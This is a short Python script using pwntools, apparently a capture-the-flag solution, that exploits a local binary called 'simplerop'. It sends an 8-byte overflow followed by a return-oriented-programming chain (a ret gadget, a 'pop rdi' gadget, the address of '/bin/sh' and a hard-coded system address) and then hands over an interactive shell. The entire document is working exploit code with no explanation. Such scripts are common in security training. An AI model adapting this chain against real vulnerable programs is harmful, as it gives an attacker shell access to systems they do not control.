from pwn import *

elf = ELF("simplerop")
rop = ROP(elf.path)
r = elf.process()
offset = 0x8

payload = b'A' * offset
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(rop.find_gadget(["pop rdi"])[0])
payload += p64(next(elf.search(b'/bin/sh\x00')))
payload += p64(0x401080)  # addess of system
r.send(payload)

r.recvuntil("yourself.\n")
r.interactive()
